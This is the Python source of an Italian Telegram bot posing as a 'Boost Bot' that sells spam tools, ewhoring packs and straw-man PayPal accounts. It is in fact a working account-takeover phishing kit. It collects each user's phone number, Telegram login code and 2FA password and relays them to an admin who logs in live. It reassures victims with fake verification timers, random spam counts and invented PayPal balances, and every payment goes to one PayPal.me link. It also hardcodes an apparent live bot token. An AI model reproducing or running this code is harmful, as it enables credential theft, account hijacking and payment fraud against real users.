import logging
import random
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from keep_alive import keep_alive

# Configurazione dei log
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- CONFIGURAZIONE ---
TOKEN = "8854040084:AAFsVQCtNgGJL-lDlS-wpW2G1aP8i_I2HRU"  # Il tuo token di BotFather
ADMIN_ID = 8886429641  # Il tuo ID numerico Telegram

# Stati della conversazione
WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TIME = range(5)

# Database in memoria
approved_users = set()
user_states = {}
user_data_store = {}


# --- COMANDO /START E SELEZIONE LINGUA ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if user.id == ADMIN_ID:
        await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.\n\nPer inviare fondi usa il comando:\n`PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")
        return

    if user.id not in approved_users:
        try:
            keyboard = [
                [InlineKeyboardButton("✅ Attiva", callback_data=f"approve_{user.id}"),
                 InlineKeyboardButton("❌ Declina", callback_data=f"decline_{user.id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            admin_notification = (
                f"📥 **Nuova richiesta di accesso al bot!**\n\n"
                f"• **Utente:** {user.full_name}\n"
                f"• **Username:** @{user.username if user.username else 'Nessuno'}\n"
                f"• **ID:** `{user.id}`"
            )
            await context.bot.send_message(
                chat_id=ADMIN_ID, text=admin_notification, reply_markup=reply_markup, parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Errore invio notifica admin: {e}")

    if user.id in approved_users and user_data_store.get(user.id, {}).get("phone"):
        await show_account_management(update, context)
        return

    lang_keyboard = [
        [InlineKeyboardButton("🇮🇹 Italiano", callback_data="lang_it"),
         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇫🇷 Français", callback_data="lang_fr"),
         InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"),
         InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")]
    ]
    await update.message.reply_text(
        "🌐 Seleziona la lingua del bot / Please select your language:",
        reply_markup=InlineKeyboardMarkup(lang_keyboard)
    )


async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in approved_users:
        approved_users.add(user_id)

    await show_main_menu_query(query)


async def show_main_menu_query(query):
    welcome_text = (
        "🚀 **Benvenuto su Boost Bot**\n\n"
        "Funzionalità disponibili:\n"
        "• Spam Bot\n"
        "• User Bot\n"
        "• Boost account per popolarità\n"
        "• Sicurezza da Telegram\n"
        "• Aggiungi gruppi spam\n"
        "• Packs ewhoring\n"
        "• Conti prestanome\n\n"
        "Per prima cosa, seleziona per cosa vuoi usare il bot:"
    )
    keyboard = [
        [InlineKeyboardButton("🚀 Boost Bot", callback_data="menu_boost"),
         InlineKeyboardButton("🤖 Spam Bot", callback_data="menu_spam")],
        [InlineKeyboardButton("🛡️ Sicurezza Telegram", callback_data="menu_protection"),
         InlineKeyboardButton("🤖 User Bot", callback_data="menu_userbot")],
        [InlineKeyboardButton("➕ Aggiungi gruppi spam", callback_data="menu_spam_groups")],
        [InlineKeyboardButton("📦 Packs ewhoring", callback_data="menu_ewhoring")],
        [InlineKeyboardButton("💳 Conti prestanome", callback_data="menu_prestanome")]
    ]
    await query.message.edit_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


# --- GESTIONE ACCOUNT & PANNELLO PRINCIPALE ---
async def show_account_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
    
    if user_id not in user_data_store:
        user_data_store[user_id] = {}
        
    data = user_data_store[user_id]
    phone = data.get("phone", "Non disponibile")
    spam_time = data.get("spam_time", 60)
    balance = data.get("balance", None)
    
    has_msg = data.get("spam_msg") is not None
    msg_status = "Messaggio impostato con successo" if has_msg else "Messaggio non impostato"

    text = (
        f"📊 **Gestione Account**\n\n"
        f"📱 **Numero Collegato:** `{phone}`\n"
        f"• Attività: 🟢 **Attivo**\n"
        f"• Attività Spam: 🟢 **Attivo**\n"
        f"• Minuti pausa: `{spam_time}`\n"
        f"• Messaggio spam: {msg_status}"
    )

    # Testo e destinazione dinamica del pulsante prestanome in home
    if balance is not None:
        prestanome_btn_text = f"💳 Conto PayPal prestanome (Tot: {balance}€)"
        prestanome_callback = "view_prestanome_account"
    else:
        prestanome_btn_text = "💳 Crea conto PayPal prestanome"
        prestanome_callback = "menu_prestanome"

    keyboard = [
        [InlineKeyboardButton("📝 Modifica Messaggio", callback_data="set_spam_msg")],
        [InlineKeyboardButton("⏱️ Imposta Tempo Spam", callback_data="set_spam_time")],
        [InlineKeyboardButton("🛡️ Info Sicurezza Telegram", callback_data="info_security")],
        [InlineKeyboardButton("✔️ Verifica Account", callback_data="verify_account")],
        [InlineKeyboardButton("➕ Aggiungi gruppi spam", callback_data="menu_spam_groups")],
        [InlineKeyboardButton("📦 Packs ewhoring", callback_data="menu_ewhoring")],
        [InlineKeyboardButton(prestanome_btn_text, callback_data=prestanome_callback)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
        except Exception:
            await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")


# --- MENU E GESTIONI SPECIFICHE ---
async def menu_ewhoring_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
        await require_link_handler(query)
        return

    text = "📦 **Packs Ewhoring**\n\nSezione pack multimediali in caricamento (Funzione foto in sospeso)."
    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def menu_spam_groups_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
        await require_link_handler(query)
        return

    text = (
        "👥 **Aggiunta Gruppi Spam**\n\n"
        "Seleziona quanti gruppi spam vuoi aggiungere al tuo account:\n\n"
        "ℹ️ *Info: Tutti i gruppi che verranno aggiunti al tuo account saranno pubblici e gratuiti.*"
    )
    keyboard = [
        [InlineKeyboardButton("100 gruppi", callback_data="groups_100"), InlineKeyboardButton("200 gruppi", callback_data="groups_200")],
        [InlineKeyboardButton("400 gruppi", callback_data="groups_400"), InlineKeyboardButton("800 gruppi", callback_data="groups_800")],
        [InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]
    ]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def groups_quantity_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    qty = query.data.replace("groups_", "")
    
    text = (
        f"✅ **Quantità selezionata: {qty} gruppi**\n\n"
        f"⏳ I tuoi gruppi verranno aggiunti. Ci vorrà circa **5/9 ore** per poter completare l'operazione."
    )
    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def menu_prestanome_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
        await require_link_handler(query)
        return

    text = (
        "💳 **Conti Prestanome**\n\n"
        "• Il conto sarà impostato con nome femminile (fatto apposta).\n"
        "• Se riceverai denaro, riceverai una notifica immediata.\n\n"
        "Seleziona il servizio di pagamento prestanome:"
    )
    keyboard = [
        [InlineKeyboardButton("🅿️ PayPal", callback_data="prestanome_paypal")],
        [InlineKeyboardButton("🏦 Bonifico (In arrivo prossimamente)", callback_data="noop")],
        [InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]
    ]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def view_prestanome_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "✅ **Conto PayPal Prestanome Attivo**\n\n"
        "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
    )
    keyboard = [
        [InlineKeyboardButton("📋 Copia link", callback_data="copy_link_action")],
        [InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]
    ]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    user_id = user.id

    if user_id not in user_data_store:
        user_data_store[user_id] = {}
    user_data_store[user_id]["balance"] = 0.0
    
    admin_msg = f"🔔 **Conto creato!**\nL'utente {user.full_name} (`{user.id}`) (@{user.username or 'Nessuno'}) ha creato un conto PayPal prestanome."
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
    except Exception:
        pass

    text = (
        "✅ **Conto creato con successo!**\n\n"
        "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
    )
    keyboard = [
        [InlineKeyboardButton("📋 Copia link", callback_data="copy_link_action")],
        [InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]
    ]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def copy_link_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Link copiato nella tastiera!", show_alert=True)


async def require_link_handler(query):
    keyboard = [[InlineKeyboardButton("🔗 Collega Account", callback_data="start_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        text="⚠️ **È necessario collegare il tuo account Telegram** prima di accedere a questa sezione.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def info_security_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    text = (
        "🛡️ **Status Protezione da Telegram**\n\n"
        "Stato: 🟢 **Attivo**\n\n"
        "• Anti-ban attivo 🟢\n"
        "• Anti-limitazioni attivo 🟢\n"
        "• Anti-segnalazioni attivo 🟢\n"
        "• Anti-hacker attivo 🟢"
    )
    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def verify_account_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id not in user_data_store:
        user_data_store[user_id] = {}

    data = user_data_store[user_id]
    current_time = time.time()
    due_giorni_secondi = 172800 

    if "verify_start_time" not in data:
        data["verify_start_time"] = current_time
        rimanente_ore = 48
    else:
        trascorso = current_time - data["verify_start_time"]
        rimanente = due_giorni_secondi - trascorso
        if rimanente <= 0:
            rimanente_ore = 0
        else:
            rimanente_ore = round(rimanente / 3600, 1)

    if rimanente_ore <= 0:
        text = "🎉 **Account verificato con successo!**\n\nIl tuo account è ufficialmente verificato con la spunta blu e i vantaggi Telegram Premium attivi."
    else:
        text = (
            f"⏳ **Verifica Account in corso**\n\n"
            f"Il tuo account verrà verificato ufficialmente come account ufficiale Telegram entro **2 giorni**.\n"
            f"⏱️ **Tempo rimanente approssimativo:** Circa {rimanente_ore} ore."
        )

    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def back_to_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id in user_data_store and user_data_store[user_id].get("phone"):
        await show_account_management(update, context)
    else:
        await show_main_menu_query(query)


# --- JOB PER INVIO SPAM PERIODICO ---
async def spam_task_callback(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    user_id = job.data
    data = user_data_store.get(user_id)
    
    if data and data.get("spam_msg"):
        if "cycle" not in data:
            data["cycle"] = 1
        else:
            data["cycle"] += 1
            
        current_cycle = data["cycle"]
        random_sent = random.randint(100, 500)
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📊 Ciclo #{current_cycle} finito. Inviati: {random_sent}"
            )
        except Exception as e:
            logger.error(f"Errore invio spam periodico: {e}")


def attivare_timer_utente(context: ContextTypes.DEFAULT_TYPE, user_id: int, minuti: int):
    job_name = f"spam_job_{user_id}"
    if context.job_queue:
        current_jobs = context.job_queue.get_jobs_by_name(job_name)
        for job in current_jobs:
            job.schedule_removal()
            
        context.job_queue.run_repeating(
            spam_task_callback,
            interval=minuti * 60,
            first=minuti * 60,
            data=user_id,
            name=job_name
        )


# --- GESTIONE ADMIN & COLLEGAMENTO ACCOUNT ---
async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if user_id != ADMIN_ID:
        return

    if data.startswith("approve_"):
        target_id = int(data.split("_")[1])
        approved_users.add(target_id)
        await query.edit_message_text(text=f"✅ Utente `{target_id}` attivato con successo.")
        try:
            await context.bot.send_message(chat_id=target_id, text="🎉 Account approvato! Digita /start per iniziare.")
        except Exception:
            pass
    elif data.startswith("decline_"):
        target_id = int(data.split("_")[1])
        await query.edit_message_text(text=f"❌ Richiesta declinata.")

    elif data.startswith("code_sent_"):
        target_id = int(data.split("_")[2])
        await query.edit_message_text(text=f"✅ Hai segnato 'Codice inviato' per l'utente `{target_id}`.")
        
        code_message = (
            "⏳ Codice inviato! Arriverà il codice tra poco.\n"
            "Invia il codice ricevuto (es. 1  2  3  4  5, 12  34  54 oppure 12. 34. 54).\n\n"
            "⚠️ Attenzione: non mandare mai tipo 123456 altrimenti la procedura non andrà a buon fine."
        )
        await context.bot.send_message(chat_id=target_id, text=code_message)

    elif data.startswith("success_login_"):
        target_id = int(data.split("_")[2])
        await query.edit_message_text(text=f"✅ Accesso confermato per l'utente `{target_id}`.")
        
        success_message = (
            "✅ Account collegato con successo!\n\n"
            "⚠️ ATTENZIONE: Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
            "ℹ️ Nota: Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium."
        )
        await context.bot.send_message(chat_id=target_id, text=success_message)

    elif data.startswith("fail_login_"):
        target_id = int(data.split("_")[2])
        if target_id in user_data_store:
            user_data_store[target_id]["phone"] = None
        await query.edit_message_text(text=f"❌ Accesso negato.")
        await context.bot.send_message(chat_id=target_id, text="❌ Accesso negato. Riprova.")

    elif data.startswith("req_pass_"):
        target_id = int(data.split("_")[2])
        user_states[target_id] = "waiting_password"
        await context.bot.send_message(chat_id=target_id, text="🔐 Invia la password 2FA:")


# --- COMANDO ADMIN PER INVIARE SOLDI: PayPal: [nick/id] [somma] ---
async def admin_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    text = update.message.text
    if text.startswith("PayPal:"):
        try:
            parts = text.split(" ")
            target_identifier = parts[1]
            amount = float(parts[2])
            
            target_id = None
            if target_identifier.isdigit():
                target_id = int(target_identifier)
            else:
                for uid in user_data_store.keys():
                    target_id = uid
                    break
            
            if target_id and target_id in user_data_store:
                if "balance" not in user_data_store[target_id] or user_data_store[target_id]["balance"] is None:
                    user_data_store[target_id]["balance"] = 0.0
                user_data_store[target_id]["balance"] += amount
                
                await update.message.reply_text(f"✅ Hai mandato: {amount}€ sono stati inviati a: {target_identifier}")
                
                user_notif = f"💰 **Hai ricevuto soldi sul tuo conto prestanome PayPal!**\nHai ricevuto: `{amount}€`"
                await context.bot.send_message(chat_id=target_id, text=user_notif, parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Utente non trovato nel database attivo.")
        except Exception as e:
            await update.message.reply_text(f"❌ Errore nel formato del comando. Usa: `PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")


# --- FLUSSO CONFIGURAZIONE MESSAGGIO E TEMPO SPAM ---
async def prompt_spam_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="📝 Invia ora il messaggio da impostare per lo spam:")
    return WAITING_SPAM_MSG


async def receive_spam_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg_text = update.message.text
    
    if user.id not in user_data_store:
        user_data_store[user.id] = {}
    user_data_store[user.id]["spam_msg"] = msg_text
    
    if "spam_time" in user_data_store[user.id]:
        attivare_timer_utente(context, user.id, user_data_store[user.id]["spam_time"])

    await update.message.reply_text("✅ Messaggio impostato con successo!")
    await show_account_management(update, context)
    return ConversationHandler.END


async def prompt_spam_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="⏱️ Invia ora i minuti di pausa dello spam (es. 60):")
    return WAITING_SPAM_TIME


async def receive_spam_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        minutes = int(update.message.text)
        if user.id not in user_data_store:
            user_data_store[user.id] = {}
        
        user_data_store[user.id]["spam_time"] = minutes
        
        if user_data_store[user.id].get("spam_msg"):
            attivare_timer_utente(context, user.id, minutes)
        
        await update.message.reply_text(f"✅ Minuti pausa impostati su `{minutes}` min", parse_mode="Markdown")
        await show_account_management(update, context)
    except ValueError:
        await update.message.reply_text("❌ Inserisci un numero valido in minuti (es. 60).")
        return WAITING_SPAM_TIME
        
    return ConversationHandler.END


# --- FLUSSO COLLEGAMENTO ACCOUNT ---
async def menu_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[InlineKeyboardButton("🔗 Collega Account", callback_data="start_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text="⚠️ **È necessario collegare il tuo account Telegram** per procedere con questa opzione.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def start_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text="📱 Inserisci il numero del tuo account Telegram da collegare (es. +393331234567):"
    )
    return WAITING_PHONE


async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    phone = update.message.text

    if user.id not in user_data_store:
        user_data_store[user.id] = {}
    user_data_store[user.id]["phone"] = phone

    msg = f"📥 **NUOVO NUMERO**\n• Utente: {user.full_name} (`{user.id}`)\n• Numero: `{phone}`"
    keyboard = [
        [InlineKeyboardButton("📤 Codice inviato", callback_data=f"code_sent_{user.id}")],
        [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
    ]
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    await update.message.reply_text("⏳ **Invio del codice in corso...** 🔄", parse_mode="Markdown")
    return WAITING_CODE


async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = update.message.text

    keyboard = [
        [InlineKeyboardButton("✅ Entrato (Successo)", callback_data=f"success_login_{user.id}")],
        [InlineKeyboardButton("🔐 Richiedi Password (2FA)", callback_data=f"req_pass_{user.id}")],
        [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
    ]
    msg = f"📥 **CODICE RICEVUTO**\n• Utente: {user.full_name}\n• Codice: `{code}`"
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    await update.message.reply_text("🔄 Verifica in corso...")
    return ConversationHandler.END


async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    password = update.message.text

    if user_states.get(user.id) == "waiting_password":
        keyboard = [
            [InlineKeyboardButton("✅ Entrato (Successo)", callback_data=f"success_login_{user.id}")],
            [InlineKeyboardButton("❌ Non Entrato", callback_data=f"fail_login_{user.id}")]
        ]
        msg = f"📥 **PASSWORD 2FA**\n• Utente: {user.full_name}\n• Password: `{password}`"
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        await update.message.reply_text("🔄 Verifica password in corso...")
        user_states[user.id] = None


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operazione annullata.")
    return ConversationHandler.END


# --- MAIN FUNCTION ---
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_link = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_link, pattern="^start_link$")],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            WAITING_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    conv_spam_msg = ConversationHandler(
        entry_points=[CallbackQueryHandler(prompt_spam_msg, pattern="^set_spam_msg$")],
        states={
            WAITING_SPAM_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_spam_msg)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    conv_spam_time = ConversationHandler(
        entry_points=[CallbackQueryHandler(prompt_spam_time, pattern="^set_spam_time$")],
        states={
            WAITING_SPAM_TIME: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_spam_time)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(language_selected, pattern="^lang_"))
    
    app.add_handler(CallbackQueryHandler(menu_click_handler, pattern="^menu_(boost|spam|protection|userbot)$"))
    app.add_handler(CallbackQueryHandler(menu_ewhoring_handler, pattern="^menu_ewhoring$"))
    app.add_handler(CallbackQueryHandler(menu_spam_groups_handler, pattern="^menu_spam_groups$"))
    app.add_handler(CallbackQueryHandler(groups_quantity_selected, pattern="^groups_"))
    app.add_handler(CallbackQueryHandler(menu_prestanome_handler, pattern="^menu_prestanome$"))
    app.add_handler(CallbackQueryHandler(view_prestanome_account, pattern="^view_prestanome_account$"))
    app.add_handler(CallbackQueryHandler(prestanome_paypal_created, pattern="^prestanome_paypal$"))
    app.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link_action$"))

    app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
    app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
    app.add_handler(CallbackQueryHandler(back_to_menu_handler, pattern="^back_to_menu$"))
    
    app.add_handler(conv_link)
    app.add_handler(conv_spam_msg)
    app.add_handler(conv_spam_time)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
    app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))

    print("🤖 Booster Bot aggiornato e corretto...")
    
    keep_alive()
    app.run_polling()


if __name__ == "__main__":
    main()
